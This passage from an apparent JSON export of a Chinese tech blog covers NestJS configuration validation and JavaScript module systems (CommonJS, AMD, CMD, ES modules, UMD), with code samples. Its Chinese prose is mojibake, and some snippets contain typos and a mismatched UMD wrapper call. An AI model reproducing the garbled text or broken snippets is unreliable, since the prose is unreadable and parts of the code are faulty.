¡éªŒç¯å¢ƒå˜é‡å¦‚æœæ‰€éœ€çš„ç¯å¢ƒå˜é‡æ²¡æœ‰è¢«æä¾›æˆ–ä¸ç¬¦åˆæŸäº›éªŒè¯è§„åˆ™ï¼Œåœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶æŠ›å‡ºå¼‚å¸¸æ˜¯æ ‡å‡†åšæ³•ã€‚@nestjsconfigåŒ…æœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼æ¥å®ç°è¿™ä¸€ç‚¹ã€‚ Joiå†…ç½®éªŒè¯å™¨ã€‚ä½¿ç”¨Joiï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªå¯¹è±¡æ¨¡å¼ï¼Œå¹¶å¯¹å…¶è¿›è¡ŒJavaScriptå¯¹è±¡éªŒè¯ã€‚ ä¸€ä¸ªè‡ªå®šä¹‰çš„validate()å‡½æ•°ï¼Œå®ƒæ¥å—ç¯å¢ƒå˜é‡ä½œä¸ºè¾“å…¥ã€‚ è¦ä½¿ç”¨Joiï¼Œæˆ‘ä»¬å¿…é¡»å®‰è£…JoiåŒ…: 1$ yarn add joi æœ€æ–°ç‰ˆæœ¬çš„joiéœ€è¦ä½ è¿è¡ŒNode v12æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚æ—§ç‰ˆæœ¬çš„nodeè¯·å®‰è£…v16.1.8ã€‚è¿™ä¸»è¦æ˜¯åœ¨v17.0.2å‘å¸ƒåï¼Œåœ¨æ„å»ºçš„æ—¶å€™ä¼šå‡ºç°é”™è¯¯ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è€ƒå…¶17.0.0å‘å¸ƒè¯´æ˜(https://github.com/sideway/joi/issues/2262)ã€‚ ç°åœ¨æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªJoiéªŒè¯æ¨¡å¼ï¼Œå¹¶é€šè¿‡forRoot()æ–¹æ³•çš„é€‰é¡¹å¯¹è±¡çš„validationSchemaå±æ€§ä¼ é€’ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ 123456789101112131415import * as Joi from 'joi';@Module({ imports: [ ConfigModule.forRoot({ validationSchema: Joi.object({ NODE_ENV: Joi.string() .valid('development', 'production', 'test', 'provision') .default('development'), PORT: Joi.number().default(3000), }), }), ],})export class AppModule {} é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„ schema keys éƒ½è¢«è®¤ä¸ºæ˜¯å¯é€‰çš„ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ä¸º NODE_ENVå’ŒPORTè®¾ç½®äº†é»˜è®¤å€¼ï¼Œå¦‚æœæˆ‘ä»¬ä¸åœ¨ç¯å¢ƒ(.envæ–‡ä»¶æˆ–è¿›ç¨‹ç¯å¢ƒ)ä¸­æä¾›è¿™äº›å˜é‡ï¼Œå°±ä¼šä½¿ç”¨è¿™äº›å˜é‡ã€‚å¦å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ required() éªŒè¯æ–¹æ³•æ¥è¦æ±‚å¿…é¡»åœ¨ç¯å¢ƒ (.env æ–‡ä»¶æˆ–è¿›ç¨‹ç¯å¢ƒ) ä¸­å®šä¹‰ä¸€ä¸ªå€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰åœ¨ç¯å¢ƒä¸­æä¾›å˜é‡ï¼ŒéªŒè¯æ­¥éª¤å°†æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚å…³äºå¦‚ä½•æ„é€ éªŒè¯æ¨¡å¼ï¼Œè¯·å‚è§JoiéªŒè¯æ–¹æ³•ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå…è®¸æœªçŸ¥çš„ç¯å¢ƒå˜é‡ï¼ˆæ¨¡å¼ä¸­é”®ä¸å­˜åœ¨çš„ç¯å¢ƒå˜é‡ï¼‰ï¼Œå¹¶ä¸”ä¸ä¼šè§¦å‘éªŒè¯å¼‚å¸¸ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„éªŒè¯é”™è¯¯éƒ½ä¼šè¢«æŠ¥å‘Šã€‚ä½ å¯ä»¥é€šè¿‡forRoot()é€‰é¡¹å¯¹è±¡çš„validationOptionsé”®ä¼ é€’ä¸€ä¸ªé€‰é¡¹å¯¹è±¡æ¥æ”¹å˜è¿™äº›è¡Œä¸ºã€‚è¿™ä¸ªé€‰é¡¹å¯¹è±¡å¯ä»¥åŒ…å«JoiéªŒè¯é€‰é¡¹æä¾›çš„ä»»ä½•æ ‡å‡†éªŒè¯é€‰é¡¹å±æ€§ã€‚ä¾‹å¦‚ï¼Œè¦åè½¬ä¸Šé¢çš„ä¸¤ä¸ªè®¾ç½®ï¼Œå¯ä»¥ä¼ é€’è¿™æ ·çš„é€‰é¡¹ã€‚ 12345678910111213141516171819import * as Joi from 'joi';@Module({ imports: [ ConfigModule.forRoot({ validationSchema: Joi.object({ NODE_ENV: Joi.string() .valid('development', 'production', 'test', 'provision') .default('development'), PORT: Joi.number().default(3000), }), validationOptions: { allowUnknown: false, abortEarly: true, }, }), ],})export class AppModule {} @nestjsconfigåŒ…ä½¿ç”¨çš„é»˜è®¤è®¾ç½®æ˜¯: allowUnknownï¼šæ§åˆ¶æ˜¯å¦å…è®¸åœ¨ç¯å¢ƒå˜é‡ä¸­ä½¿ç”¨æœªçŸ¥é”®ã€‚é»˜è®¤ä¸ºtrueã€‚ abortEarlyï¼š å¦‚æœä¸ºtrueï¼Œåˆ™åœ¨ç¬¬ä¸€ä¸ªé”™è¯¯æ—¶åœæ­¢éªŒè¯ï¼›å¦‚æœä¸ºfalseï¼Œåˆ™è¿”å›æ‰€æœ‰é”™è¯¯ã€‚é»˜è®¤å€¼ä¸ºfalseã€‚ è¯·æ³¨æ„ï¼Œä¸€æ—¦ä½ å†³å®šä¼ é€’ä¸€ä¸ªvalidationOptionså¯¹è±¡ï¼Œä½ æ²¡æœ‰æ˜ç¡®ä¼ é€’çš„ä»»ä½•è®¾ç½®éƒ½å°†é»˜è®¤ä¸ºJoiæ ‡å‡†é»˜è®¤å€¼ï¼ˆè€Œä¸æ˜¯@nestjsconfigé»˜è®¤å€¼ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ä½ çš„è‡ªå®šä¹‰validationOptionså¯¹è±¡ä¸­æ²¡æœ‰æŒ‡å®šallowUnknownsï¼Œå®ƒå°†æœ‰Joié»˜è®¤å€¼falseã€‚å› æ­¤ï¼Œåœ¨æ‚¨çš„è‡ªå®šä¹‰å¯¹è±¡ä¸­æŒ‡å®šè¿™ä¸¤ä¸ªè®¾ç½®å¯èƒ½æ˜¯æœ€å®‰å…¨çš„ã€‚ è‡ªå®šä¹‰æ ¡éªŒå‡½æ•°å¦å¤–ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªåŒæ­¥çš„validateå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶ä¸€ä¸ªåŒ…å«ç¯å¢ƒå˜é‡çš„å¯¹è±¡ï¼ˆæ¥è‡ªenvæ–‡ä»¶å’Œè¿›ç¨‹ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«éªŒè¯è¿‡çš„ç¯å¢ƒå˜é‡çš„å¯¹è±¡ï¼Œè¿™æ ·ä½ å°±å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™è½¬æ¢å®ƒä»¬ã€‚å¦‚æœå‡½æ•°æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå®ƒå°†é˜»æ­¢åº”ç”¨ç¨‹åºçš„å¼•å¯¼ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ç»§ç»­ä½¿ç”¨class-transformerå’Œclass-validatoråŒ…ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å¿…é¡»å®šä¹‰ã€‚ ä¸€ä¸ªå…·æœ‰éªŒè¯çº¦æŸçš„ç±»ï¼Œ ä¸€ä¸ªä½¿ç”¨ plainToClass å’Œ validateSync å‡½æ•°çš„éªŒè¯å‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031import { plainToClass } from 'class-transformer';import { IsEnum, IsNumber, validateSync } from 'class-validator';enum Environment { Development = \"development\", Production = \"production\", Test = \"test\", Provision = \"provision\",}class EnvironmentVariables { @IsEnum(Environment) NODE_ENV: Environment; @IsNumber() PORT: number;}export function validate(config: Record&lt;string, unknown&gt;) { const validatedConfig = plainToClass( EnvironmentVariables, config, { enableImplicitConversion: true }, ); const errors = validateSync(validatedConfig, { skipMissingProperties: false }); if (errors.length &gt; 0) { throw new Error(errors.toString()); } return validatedConfig;} å®Œæˆè¿™äº›ä¹‹åï¼Œä½¿ç”¨validateå‡½æ•°ä½œä¸ºConfigModuleçš„é…ç½®é€‰é¡¹ï¼Œå¦‚ä¸‹æ‰€ç¤º: 12345678910import { validate } from './env.validation';@Module({ imports: [ ConfigModule.forRoot({ validate, }), ],})export class AppModule {} è‡ªå®šä¹‰getterå‡½æ•°ConfigServiceå®šä¹‰äº†ä¸€ä¸ªé€šç”¨çš„get()æ–¹æ³•ï¼Œé€šè¿‡é”®æ¥æ£€ç´¢é…ç½®å€¼ã€‚æˆ‘ä»¬è¿˜å¯ä»¥æ·»åŠ getterå‡½æ•°ï¼Œä»¥å®ç°æ›´è‡ªç„¶çš„ç¼–ç é£æ ¼ã€‚ 12345678@Injectable()export class ApiConfigService { constructor(private configService: ConfigService) {} get isAuthEnabled(): boolean { return this.configService.get('AUTH_ENABLED') === 'true'; }} ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨getterå‡½æ•°å¦‚ä¸‹: 12345678@Injectable()export class AppService { constructor(apiConfigService: ApiConfigService) { if (apiConfigService.isAuthEnabled) { // Authentication is enabled } }} å¯æ‰©å±•å˜é‡@nestjsconfigæ”¯æŒç¯å¢ƒå˜é‡æ‰©å±•ã€‚é€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œä½ å¯ä»¥åˆ›å»ºåµŒå¥—çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­ä¸€ä¸ªå˜é‡è¢«å¼•ç”¨åˆ°å¦ä¸€ä¸ªå˜é‡çš„å®šä¹‰ä¸­ã€‚æ¯”å¦‚è¯´ 12APP_URL=mywebsite.comSUPPORT_EMAIL=support@${APP_URL} é€šè¿‡è¿™ç§ç»“æ„ï¼Œå˜é‡SUPPORT_EMAILè§£æä¸ºsupport@mywebsite.comã€‚è¯·æ³¨æ„ä½¿ç”¨ ${...} è¯­æ³•æ¥è§¦å‘è§£æ SUPPORT_EMAIL å®šä¹‰ä¸­çš„å˜é‡ APP_URL çš„å€¼ã€‚ å¯¹äºè¿™ä¸ªåŠŸèƒ½ï¼Œ@nestjsconfigåŒ…å†…éƒ¨ä½¿ç”¨dotenv-expandã€‚ ä½¿ç”¨ä¼ é€’ç»™ConfigModuleçš„forRoot()æ–¹æ³•çš„é€‰é¡¹å¯¹è±¡ä¸­çš„expandVariableså±æ€§å¯ç”¨ç¯å¢ƒå˜é‡æ‰©å±•ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 123456789@Module({ imports: [ ConfigModule.forRoot({ // ... expandVariables: true, }), ],})export class AppModule {} åœ¨ main.ts ä¸­ä½¿ç”¨è™½ç„¶æˆ‘ä»¬çš„é…ç½®æ˜¯å­˜å‚¨åœ¨serviceä¸­çš„ï¼Œä½†å®ƒä»ç„¶å¯ä»¥åœ¨main.tsæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚è¿™æ ·ï¼Œä½ å°±å¯ä»¥ç”¨å®ƒæ¥å­˜å‚¨å˜é‡ï¼Œå¦‚åº”ç”¨ç¨‹åºç«¯å£æˆ–CORS hostã€‚ è¦è®¿é—®å®ƒï¼Œä½ å¿…é¡»ä½¿ç”¨app.get()æ–¹æ³•ï¼Œç„¶åæ˜¯æœåŠ¡å¼•ç”¨ã€‚ 1const configService = app.get(ConfigService); ç„¶åï¼Œä½ å¯ä»¥åƒå¾€å¸¸ä¸€æ ·ï¼Œé€šè¿‡è°ƒç”¨é…ç½®é”®çš„getæ–¹æ³•æ¥ä½¿ç”¨å®ƒã€‚ 1const port = configService.get('PORT'); æœ¬æ–‡åŸºæœ¬ä¸Šæ˜¯å®˜æ–‡æ–‡æ¡£ä¸­æœ‰å…³é…ç½®éƒ¨åˆ†çš„ä¸­æ–‡ç¿»è¯‘ï¼ˆhttps://docs.nestjs.com/techniques/configurationï¼‰ï¼Œæœ‰æ—¶é—´å†å†™ä¸ªå®æˆ˜æ–‡ç« ã€‚"},{"title":"Javascript æ¨¡å—ç®¡ç†","path":"/2020/08/29/Javascript æ¨¡å—ç®¡ç†/","content":"CommonJSCommonJSæ˜¯Node.jså¯¹æ¨¡å—å¼€å‘çš„æ ‡å‡†è§„èŒƒã€‚ CommonJS moduleåŸºæœ¬è¦æ±‚å¦‚ä¸‹ï¼š ä¸€ä¸ªæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæ‹¥æœ‰å•ç‹¬çš„ä½œç”¨åŸŸ æ™®é€šæ–¹å¼å®šä¹‰çš„ å˜é‡ã€å‡½æ•°ã€å¯¹è±¡éƒ½å±äºè¯¥æ¨¡å—å†… é€šè¿‡ require æ¥åŠ è½½æ¨¡å— é€šè¿‡ exports å’Œ module.exports æ¥æš´éœ²æ¨¡å—ä¸­çš„å†…å®¹ demo1: 1234567891011121314// module.jsmodule.exports = { name: \"zhang\", getName: function() { console.log(this.name); }, changeName: function(n) { this.name = n; }};// index.jsconst module = require(\"./module/index\");console.log(module)\t// {name: \"zhang\", getName: Æ’, changeName: Æ’} \"commons\" demo2: 1234567891011121314// module1.jsconst getParam = () =&gt; { console.log(a);};let a = 123;let b = 456;exports.a = a;exports.b = b;exports.getParam = getParam;// index.jsconst module1 = require(\"./module/index1\");consoel.log(module1, \"commons1\")\t// {a: 123, b: 456, getParam: Æ’} \"commons1\" demo3: 1234567891011121314151617// module2.jslet a = 123;const getSome = () =&gt; { console.log(\"yyy\");};const getA = () =&gt; { console.log(a);};exports.getSome = getSome;module.exports = getA;// index.jsconst module2 = require(\"./module/index2\");consoel.log(module2, \"commons2\")\t// function getA() {...} æ€»ç»“ ï¼š é€šè¿‡è¿™æ ·çš„ä¸€ä¸ªå¯¹æ¯”çš„ä¾‹å­å°±å¯ä»¥æ¯”è¾ƒæ¸…æ™°çš„å¯¹æ¯”å‡º exports å’Œ module.exports çš„åŒºåˆ«:1ã€å½“ exports å’Œ module.exports åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œmodule.exports ä¼šç›–è¿‡ exports2ã€å½“æ¨¡å—å†…éƒ¨å…¨éƒ¨æ˜¯ exports çš„æ—¶å€™ï¼Œ å°±ç­‰åŒäº module.exports3ã€æœ€å æˆ‘ä»¬å°±å¯ä»¥è®¤å®šä¸º exports å…¶å®å°±æ˜¯ module.exports çš„å­é›†ã€‚ AMDAMDå…¨ç§°ä¸ºå¼‚æ­¥æ¨¡å—å®šä¹‰, æ˜¯ä¸“é—¨ä¸ºæµè§ˆå™¨ä¸­JavaScriptç¯å¢ƒè®¾è®¡çš„è§„èŒƒã€‚ AMDè®¾è®¡å‡ºä¸€ä¸ªç®€æ´çš„å†™æ¨¡å—APIï¼š define(id?, dependencies?, factory); å…¶ä¸­ï¼š id: æ¨¡å—æ ‡è¯†ï¼Œå¯ä»¥çœç•¥ã€‚ dependencies: æ‰€ä¾èµ–çš„æ¨¡å—ï¼Œå¯ä»¥çœç•¥ã€‚ factory: æ¨¡å—çš„å®ç°ï¼Œæˆ–è€…ä¸€ä¸ªJavaScriptå¯¹è±¡ã€‚å¦‚æœä¸ºå‡½æ•°ï¼Œå®ƒåº”è¯¥åªè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœæ˜¯å¯¹è±¡ï¼Œæ­¤å¯¹è±¡åº”è¯¥ä¸ºæ¨¡å—çš„è¾“å‡ºå€¼ã€‚ ä½¿ç”¨RequireJSçš„requireå‡½æ•°åŠ è½½æ¨¡å—: require([dependencies], callback); dependencies: è¡¨ç¤ºæ‰€ä¾èµ–çš„æ¨¡å— callback: ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå½“å‰é¢æŒ‡å®šçš„æ¨¡å—éƒ½åŠ è½½æˆåŠŸåï¼Œå®ƒå°†è¢«è°ƒç”¨ã€‚åŠ è½½çš„æ¨¡å—ä¼šä»¥å‚æ•°å½¢å¼ä¼ å…¥è¯¥å‡½æ•°ï¼Œä»è€Œåœ¨å›è°ƒå‡½æ•°å†…éƒ¨å°±å¯ä»¥ä½¿ç”¨è¿™äº›æ¨¡å— base.js 123456define(function() { return { mix: function(source, target) { } };}); ui.js 1234567define(['base'], function(base) { return { show: function() { // todo with module base } }}); page.js 123define(['data', 'ui'], function(data, ui) { // init here}) data.js 1234define({ users: [], members: []}); ä»¥ä¸ŠåŒæ—¶æ¼”ç¤ºäº†defineçš„ä¸‰ç§ç”¨æ³• å®šä¹‰æ— ä¾èµ–çš„æ¨¡å—ï¼ˆbase.jsï¼‰ å®šä¹‰æœ‰ä¾èµ–çš„æ¨¡å—ï¼ˆui.jsï¼Œpage.jsï¼‰ å®šä¹‰æ•°æ®å¯¹è±¡æ¨¡å—ï¼ˆdata.jsï¼‰ CMDAMDå¼€å§‹ä¸ºæ‘†è„±CommonJSçš„æŸç¼šï¼Œå¼€åˆ›æ€§çš„æå‡ºäº†è‡ªå·±çš„æ¨¡å—é£æ ¼ã€‚ä½†åæ¥åˆåšäº†å¦¥åï¼Œå…¼å®¹äº† CommonJS Modules/Wrappings ã€‚æ‰€ä»¥å°±æœ‰äº†CMD, å®ƒçš„è¯­æ³•å¦‚ä¸‹: define(id?, dependencies?, factory); å› ä¸ºCMDæ¨å´‡ä¸€ä¸ªæ–‡ä»¶ä¸€ä¸ªæ¨¡å—ï¼Œæ‰€ä»¥ç»å¸¸å°±ç”¨æ–‡ä»¶åä½œä¸ºæ¨¡å—idï¼› CMDæ¨å´‡ä¾èµ–å°±è¿‘ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸åœ¨defineçš„å‚æ•°ä¸­å†™ä¾èµ–ï¼Œè€Œæ˜¯åœ¨factoryä¸­å†™ã€‚ factoryæœ‰ä¸‰ä¸ªå‚æ•°ï¼š 1function(require, exports, module){} require: require æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œæ¥å— æ¨¡å—æ ‡è¯† ä½œä¸ºå”¯ä¸€å‚æ•°ï¼Œç”¨æ¥è·å–å…¶ä»–æ¨¡å—æä¾›çš„æ¥å£ï¼› exports: exports æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨æ¥å‘å¤–æä¾›æ¨¡å—æ¥å£ï¼› module: module æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸Šé¢å­˜å‚¨äº†ä¸å½“å‰æ¨¡å—ç›¸å…³è”çš„ä¸€äº›å±æ€§å’Œæ–¹æ³•ã€‚ demo: 123456define(function(require, exports, module) { var base = require('base'); exports.show = function() { // todo with module base }}); AMDæ¨å´‡ä¾èµ–å‰ç½®ï¼Œåœ¨å®šä¹‰æ¨¡å—çš„æ—¶å€™å°±è¦å£°æ˜å…¶ä¾èµ–çš„æ¨¡å—. CMDæ¨å´‡å°±è¿‘ä¾èµ–ï¼Œåªæœ‰åœ¨ç”¨åˆ°æŸä¸ªæ¨¡å—çš„æ—¶å€™å†å»require. AMDå’ŒCMDæœ€å¤§çš„åŒºåˆ«æ˜¯å¯¹ä¾èµ–æ¨¡å—çš„æ‰§è¡Œæ—¶æœºå¤„ç†ä¸åŒï¼Œæ³¨æ„ä¸æ˜¯åŠ è½½çš„æ—¶æœºæˆ–è€…æ–¹å¼ä¸åŒå¾ˆå¤šäººè¯´requireJSæ˜¯å¼‚æ­¥åŠ è½½æ¨¡å—ï¼ŒSeaJSæ˜¯åŒæ­¥åŠ è½½æ¨¡å—ï¼Œè¿™ä¹ˆç†è§£å®é™…ä¸Šæ˜¯ä¸å‡†ç¡®çš„ï¼Œå…¶å®åŠ è½½æ¨¡å—éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œåªä¸è¿‡AMDä¾èµ–å‰ç½®ï¼Œjså¯ä»¥æ–¹ä¾¿çŸ¥é“ä¾èµ–æ¨¡å—æ˜¯è°ï¼Œç«‹å³åŠ è½½ï¼Œè€ŒCMDå°±è¿‘ä¾èµ–ï¼Œéœ€è¦ä½¿ç”¨æŠŠæ¨¡å—å˜ä¸ºå­—ç¬¦ä¸²è§£æä¸€éæ‰çŸ¥é“ä¾èµ–äº†é‚£äº›æ¨¡å—ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¤šäººè¯Ÿç—…CMDçš„ä¸€ç‚¹ï¼Œç‰ºç‰²æ€§èƒ½æ¥å¸¦æ¥å¼€å‘çš„ä¾¿åˆ©æ€§ï¼Œå®é™…ä¸Šè§£ææ¨¡å—ç”¨çš„æ—¶é—´çŸ­åˆ°å¯ä»¥å¿½ç•¥ã€‚ ES Moduleåœ¨ ES2015 æ ‡å‡†ä¸ºå‡ºæ¥ä¹‹å‰ï¼Œæœ€ä¸»è¦çš„æ˜¯CommonJSå’ŒAMDè§„èŒƒã€‚ä¸Šæ–‡ä¸­æˆ‘ä»¬å·²ç»ä»‹ç»äº† CommonJS è§„èŒƒï¼ˆä¸»è¦æ˜¯ä¸ºäº†æœåŠ¡ç«¯ NodeJS æœåŠ¡ï¼‰å’Œ AMDï¼ˆä¸»è¦å¼•ç”¨åœ¨æµè§ˆå™¨ç«¯ï¼‰ï¼Œé‚£ä¹ˆå½“ ES6æ ‡å‡†çš„å‡ºç°ï¼Œä¸ºæµè§ˆå™¨ç«¯æ¨¡å—åŒ–åšäº†ä¸€ä¸ªéå¸¸å¥½çš„è¡¥å……ã€‚ exportç”¨äºå¯¹å¤–è¾“å‡ºæœ¬æ¨¡å—ï¼ˆä¸€ä¸ªæ–‡ä»¶å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ¨¡å—ï¼‰å˜é‡çš„æ¥å£importç”¨äºå¯¼å…¥exportå¯¼å‡ºçš„æ¨¡å— 1234567891011121314151617181920212223// index.jsexport const fn1 = function () { console.log('fn1')}export const fn2 = function () { console.log('fn2')}const fn = { fn1, fn2}export default fn// index1.jsimport { fn1, fn2 } from 'index.js'fn1() // 'fn1'fn2() // 'fn2' import fn from 'index.js'console.log(fn) // {fn1: Æ’, fn2: Æ’} export å¯ä»¥å¯¼å‡ºçš„æ˜¯ä¸€ä¸ªå¯¹è±¡ä¸­åŒ…å«çš„å¤šä¸ª å±æ€§ï¼Œæ–¹æ³•ã€‚ export default åªèƒ½å¯¼å‡º ä¸€ä¸ª å¯ä»¥ä¸å…·åçš„ å¯¹è±¡ã€‚ import {fn} from './xxx/xxx' ( export å¯¼å‡ºæ–¹å¼çš„ å¼•ç”¨æ–¹å¼ ) import fn from './xxx/xxx1' ( export default å¯¼å‡ºæ–¹å¼çš„ å¼•ç”¨æ–¹å¼ ) UMDAMDä»¥æµè§ˆå™¨ä¸ºç¬¬ä¸€ï¼ˆbrowser-firstï¼‰çš„åŸåˆ™å‘å±•ï¼Œé€‰æ‹©å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚å®ƒçš„æ¨¡å—æ”¯æŒå¯¹è±¡ï¼ˆobjectsï¼‰ã€å‡½æ•°ï¼ˆfunctionsï¼‰ã€æ„é€ å™¨ï¼ˆconstructorsï¼‰ã€å­—ç¬¦ä¸²ï¼ˆstringsï¼‰ã€JSONç­‰å„ç§ç±»å‹çš„æ¨¡å—ã€‚å› æ­¤åœ¨æµè§ˆå™¨ä¸­å®ƒéå¸¸çµæ´»ã€‚ CommonJS moduleä»¥æœåŠ¡å™¨ç«¯ä¸ºç¬¬ä¸€ï¼ˆserver-firstï¼‰çš„åŸåˆ™å‘å±•ï¼Œé€‰æ‹©åŒæ­¥åŠ è½½æ¨¡å—ã€‚å®ƒçš„æ¨¡å—æ˜¯æ— éœ€åŒ…è£…çš„ï¼ˆunwrapped modulesï¼‰ä¸”è´´è¿‘äºES.next/Harmonyçš„æ¨¡å—æ ¼å¼ã€‚ä½†å®ƒä»…æ”¯æŒå¯¹è±¡ç±»å‹ï¼ˆobjectsï¼‰æ¨¡å—ã€‚ è¿™è¿«ä½¿ä¸€äº›äººåˆæƒ³å‡ºå¦ä¸€ä¸ªæ›´é€šç”¨æ ¼å¼ UMD(Universal Module Definition)ã€‚å¸Œæœ›æä¾›ä¸€ä¸ªå‰åç«¯è·¨å¹³å°çš„è§£å†³æ–¹æ¡ˆã€‚ UMDçš„å®ç°å¾ˆç®€å•ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦æ”¯æŒNode.jsæ¨¡å—æ ¼å¼ï¼ˆexportsæ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå­˜åœ¨åˆ™ä½¿ç”¨Node.jsæ¨¡å—æ ¼å¼ã€‚ å†åˆ¤æ–­æ˜¯å¦æ”¯æŒAMDï¼ˆdefineæ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå­˜åœ¨åˆ™ä½¿ç”¨AMDæ–¹å¼åŠ è½½æ¨¡å—ã€‚å‰ä¸¤ä¸ªéƒ½ä¸å­˜åœ¨ï¼Œåˆ™å°†æ¨¡å—å…¬å¼€åˆ°å…¨å±€ï¼ˆwindowæˆ–globalï¼‰ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ 1234567891011121314151617181920(function (root, factory) { if(typeof exports === 'object' &amp;&amp; typeof module === 'object') module.exports = factory(); else if(typeof define === 'function' &amp;&amp; define.amd) define([], factory); else if(typeof exports === 'object') exports[\"nav\"] = factory(); else root[\"nav\"] = factory();})(window, this, function() { // module return { addEvent: function(el, type, handle) { //... }, removeEvent: function(el, type, handle) { }, };})"}]